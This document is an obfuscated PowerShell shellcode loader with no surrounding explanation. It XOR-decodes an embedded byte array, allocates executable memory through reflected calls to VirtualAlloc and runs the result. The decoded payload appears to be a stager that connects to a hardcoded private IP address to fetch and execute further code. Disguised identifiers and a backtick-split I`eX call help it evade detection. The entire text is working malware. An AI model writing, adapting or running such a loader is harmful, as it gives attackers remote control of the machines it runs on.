Set-StrictMode -Version 2

$mMi = @'
function Kkdd {
	Param ($JS, $lWyu)		
	$p = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$yDE = $p.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $yDE.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($p.GetMethod('GetModuleHandle')).Invoke($null, @($JS)))), $lWyu))
}

function l {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $u,
		[Parameter(Position = 1)] [Type] $TRung = [Void]
	)

	$emb = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$emb.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $u).SetImplementationFlags('Runtime, Managed')
	$emb.DefineMethod('Invo'+'ke', 'Public, HideBySig, NewSlot, Virtual', $TRung, $u).SetImplementationFlags('Runtime, Managed')

	return $emb.CreateType()
}

[Byte[]]$EtGkl = [Byte[]](223,203,170,35,35,35,67,170,198,18,241,71,168,113,19,168,113,47,168,113,55,168,81,11,44,148,105,5,18,220,18,227,143,31,66,95,33,15,3,226,236,46,34,228,193,211,113,116,168,113,51,168,97,31,34,243,168,99,91,166,227,87,105,34,243,115,168,107,59,168,123,3,34,240,192,31,106,168,23,168,34,245,18,220,18,227,143,226,236,46,34,228,27,195,86,215,32,94,219,24,94,7,86,193,123,168,123,7,34,240,69,168,47,104,168,123,63,34,240,168,39,168,34,243,170,103,7,7,120,120,66,122,121,114,220,195,123,124,121,168,49,200,165,126,75,77,70,87,35,75,84,74,77,74,119,75,111,84,5,36,220,246,18,220,116,116,116,116,116,75,25,117,90,132,220,246,202,167,35,35,35,120,18,234,114,114,73,32,114,114,75,115,35,35,35,112,115,75,116,170,188,229,220,246,200,83,120,18,241,113,75,35,33,99,167,113,113,113,112,113,115,75,200,118,13,24,220,246,170,229,160,224,115,18,220,116,116,73,220,112,117,75,14,37,59,88,220,246,166,227,44,167,224,34,35,35,18,220,166,213,87,39,170,218,200,42,75,137,230,193,126,220,246,170,226,75,102,2,125,18,220,246,18,220,116,73,36,114,117,115,75,148,116,195,40,220,246,156,35,12,35,35,26,228,87,148,18,220,202,178,34,35,35,202,234,34,35,35,203,168,220,220,220,12,105,100,118,85,35,56,20,139,147,151,83,159,62,105,37,69,55,25,4,206,103,100,133,1,245,183,27,240,239,104,49,233,195,25,133,101,183,43,106,126,116,106,78,95,198,201,223,59,84,25,116,167,185,227,213,244,226,253,159,50,84,177,70,167,143,239,30,186,224,174,224,87,23,248,190,38,111,186,35,118,80,70,81,14,98,68,70,77,87,25,3,110,76,89,74,79,79,66,12,22,13,19,3,11,116,74,77,71,76,84,80,24,3,118,24,3,110,112,106,102,3,20,13,19,24,3,116,74,77,71,76,84,80,3,109,119,3,22,13,17,10,3,105,66,85,66,12,18,13,22,13,19,124,19,27,46,41,35,186,80,212,213,93,206,109,101,84,191,199,230,35,238,112,101,79,158,250,158,63,64,41,109,129,99,128,57,126,33,6,183,209,51,72,58,3,165,68,243,42,191,183,65,30,195,108,122,132,209,175,21,253,113,206,191,39,212,68,178,60,42,32,222,244,23,84,223,77,250,113,117,241,69,237,199,171,242,190,240,35,211,3,79,76,168,43,121,34,76,36,149,222,198,6,135,149,242,223,176,33,166,69,2,46,114,112,80,230,196,222,208,47,146,134,69,189,243,204,100,230,69,173,28,12,225,66,204,68,170,82,99,13,221,112,73,208,105,205,215,236,223,75,1,187,160,124,44,239,232,39,237,129,164,251,97,149,82,69,93,248,121,48,155,108,204,97,22,225,14,23,103,19,219,60,13,238,134,91,80,227,40,0,177,107,236,225,146,210,145,79,95,115,214,138,72,136,63,28,244,103,54,156,150,34,147,43,94,170,0,113,188,7,3,239,152,98,172,41,29,66,215,246,40,35,75,211,150,129,117,220,246,73,99,75,35,51,35,35,75,35,35,99,35,116,75,123,135,112,198,220,246,176,154,35,35,35,35,34,250,114,112,170,196,116,75,35,3,35,35,112,117,75,49,181,170,193,220,246,166,227,87,229,168,36,34,224,166,227,86,198,123,224,203,138,222,220,220,18,26,17,13,18,21,27,13,18,16,23,13,18,23,21,35,114,42,156,78)

for ($x = 0; $x -lt $EtGkl.Count; $x++) {
	$EtGkl[$x] = $EtGkl[$x] -bxor 35
}

$VPS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Kkdd kernel32.dll VirtualAlloc), (l @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$eX = $VPS.Invoke([IntPtr]::Zero, $EtGkl.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($EtGkl, 0, $eX, $EtGkl.length)

$IVc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($eX, (l @([IntPtr]) ([Void])))
$IVc.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) I`eX $a } -RunAs32 -Argument $mMi | wait-job | Receive-Job
}
else {
	I`eX $mMi
}
